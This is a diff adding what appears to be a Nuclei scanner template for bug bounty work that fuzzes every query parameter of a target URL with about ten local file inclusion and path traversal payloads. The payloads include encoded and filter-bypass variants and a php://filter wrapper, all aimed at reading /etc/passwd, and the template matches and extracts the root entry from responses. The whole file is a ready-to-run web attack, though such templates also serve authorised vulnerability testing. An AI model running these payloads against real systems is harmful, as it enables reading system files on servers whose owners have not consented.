@@ -1,0 +1,41 @@
+id: bugbounty-lfi
+
+info:
+  name: LFI via Params
+  author: Justin Washek
+  severity: high
+  description: |
+    Fuzzes each query parameter with LFI payloads and detects inclusion of /etc/passwd.
+  tags: lfi,fuzzing,etc-passwd,bugbounty
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    fuzzing:
+      - part: query
+        mode: single
+        fuzz:
+          - "../../../../../etc/passwd"
+          - "../../../../../../etc/passwd"
+          - "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+          - "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+          - "..%252f..%252f..%252fetc%252fpasswd"
+          - "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+          - "....//....//etc/passwd"
+          - "..//////etc/passwd"
+          - "/%5C../%5C../%5C../%5C../etc/passwd"
+          - "php://filter/read=convert.base64-encode/resource=/etc/passwd"
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:.*"
